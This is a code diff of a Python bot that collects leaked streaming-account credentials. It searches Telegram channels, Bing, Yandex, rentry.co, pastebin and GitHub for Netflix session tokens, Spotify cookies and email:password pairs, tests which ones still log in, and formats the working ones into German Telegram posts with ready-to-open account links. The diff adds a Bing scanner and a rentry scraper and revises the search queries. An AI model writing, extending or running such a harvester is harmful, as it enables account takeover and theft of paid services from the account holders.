@@ -66,7 +66,6 @@ def test_item(item):
             if "netflix.com" in item and "nftoken=" in item and "browse" not in item and "tv2" not in item:
                 token = item.split("nftoken=")[1].split("&")[0]
                 item = f"https://www.netflix.com/browse?nftoken={token}"
-
             r = requests.get(item, headers=headers, allow_redirects=True, timeout=5)
             if 'login' in r.url.lower() or 'signin' in r.url.lower() or 'unsupported' in r.url.lower():
                 return False
@@ -89,23 +88,19 @@ def build_telegram_msg(item, platform, key):
             pc_link = f"https://www.netflix.com/browse?nftoken={token}"
             mobile_link = f"https://www.netflix.com/browse?nftoken={token}&mobile=true"
             tv_link = f"https://www.netflix.com/tv2?nftoken={token}"
-            
             msg += f"💻 <b>PC Browser:</b>\n<a href='{pc_link}'>PC-Link öffnen</a>\n\n"
             msg += f"📱 <b>Handy:</b>\n<a href='{mobile_link}'>Handy-Link öffnen</a>\n\n"
             msg += f"📺 <b>Smart TV:</b>\n<a href='{tv_link}'>TV-Link öffnen</a>\n"
         except:
             msg += f"🔗 <b>Link:</b> <a href='{item}'>Account öffnen</a>\n"
-
     elif ':' in item and '@' in item:
         email, password = item.split(':', 1)
         msg += f"📧 <b>E-Mail:</b> <code>{email}</code>\n"
         msg += f"🔒 <b>Passwort:</b> <code>{password}</code>\n\n"
         msg += f"📱 <b>Gerät:</b> Funktioniert auf <b>PC, Handy & TV</b>."
-        
     else:
         msg += f"🔗 <b>Direkt-Link:</b> <a href='{item}'>Account öffnen</a>\n"
         msg += f"📱 <b>Hinweis:</b> Am besten im <b>PC Browser</b>."
-        
     return msg
 
 def scan_telegram(channel):
@@ -118,16 +113,42 @@ def scan_telegram(channel):
     except Exception: pass 
     return found
 
+def scan_bing(query):
+    found = []
+    try:
+        url = f"https://www.bing.com/search?q={query}"
+        r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}, timeout=10)
+        if r.status_code == 200:
+            for m in PATTERN.findall(r.text):
+                link = clean_link(m[0] or m[1] or m[2])
+                if link and test_item(link): found.append(link)
+    except Exception: pass
+    return found
+
 def scan_yandex(query):
     found = []
     try:
         url = f"https://yandex.com/search/?text={query}"
         r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
         if r.status_code == 200:
-            matches = PATTERN.findall(r.text)
-            for m in matches:
+            for m in PATTERN.findall(r.text):
                 link = clean_link(m[0] or m[1] or m[2])
                 if link and test_item(link): found.append(link)
+    except Exception: pass
+    return found
+
+def scan_rentry():
+    found = []
+    try:
+        r = requests.get("https://rentry.co/recent", headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
+        if r.status_code == 200:
+            links = re.findall(r'href="/([a-zA-Z0-9_-]+)"', r.text)
+            for link in list(set(links))[:10]:
+                raw_r = requests.get(f"https://rentry.co/{link}/raw", timeout=5)
+                if raw_r.status_code == 200:
+                    for m in PATTERN.findall(raw_r.text):
+                        item = clean_link(m[0] or m[1] or m[2])
+                        if item and test_item(item): found.append(item)
     except Exception: pass
     return found
 
@@ -142,8 +163,7 @@ def scan_github():
                 raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                 raw_r = requests.get(raw_url, timeout=5)
                 if raw_r.status_code == 200:
-                    matches = PATTERN.findall(raw_r.text)
-                    for m in matches:
+                    for m in PATTERN.findall(raw_r.text):
                         link = clean_link(m[0] or m[1] or m[2])
                         if link and test_item(link): found.append(link)
     except Exception: pass
@@ -152,15 +172,15 @@ def scan_github():
 def grabber_loop():
     while True:
         found_raw = []
-        
         with ThreadPoolExecutor(max_workers=15) as executor:
             results = executor.map(scan_telegram, TELEGRAM_CHANNELS)
             for res in results: found_raw.extend(res)
         
         found_raw.extend(scan_yandex('site:pastebin.com "NetflixId="'))
-        found_raw.extend(scan_yandex('site:rentry.co "NetflixId="'))
-        found_raw.extend(scan_yandex('"nftoken=" netflix'))
-        found_raw.extend(scan_yandex('site:pastebin.com "sp_dc="'))
+        found_raw.extend(scan_bing('site:pastebin.com "NetflixId="'))
+        found_raw.extend(scan_bing('site:rentry.co "NetflixId="'))
+        found_raw.extend(scan_bing('"nftoken=" netflix'))
+        found_raw.extend(scan_rentry())
         found_raw.extend(scan_github())
                 
         found_raw = list(set(found_raw)) 
